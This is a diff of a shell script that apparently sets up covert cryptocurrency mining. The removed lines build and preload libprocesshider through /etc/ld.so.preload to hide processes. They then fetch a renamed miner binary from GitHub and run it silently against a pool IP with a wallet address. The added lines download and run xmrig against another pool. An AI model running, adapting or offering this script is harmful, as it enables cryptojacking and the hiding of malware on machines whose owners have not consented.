@@ -1,20 +1,2 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-apt update
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
-service tor start
-
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-cd ..
-A=172.104.176.128:80
-B=ZEPHsBz5DP8CQwW1ex5dF45MnEiysxKnWUxbsA1FjhMdAbj1tjub6mZ8zpywvMLqWYj1AQtbNdi6ffGVfwphDZiChWU5fsRM3xD
-C=GAS
-wget https://github.com/bengetsia/soft/raw/main/jilox && chmod u+x jilox
-./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
-r
-
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig -o 172.233.80.143:443 -u ZEPHs8rEtqZaJ25FqjXvMbiFvPjuVd9VKP8whAB56jDbcBSxQuPJEhyDC7SQCGKAzcC2kT7VybgQGfVKo73aB518g7XrdF7yc1C.50 000 -p unlock -a rx/0 -k --donate-level 1
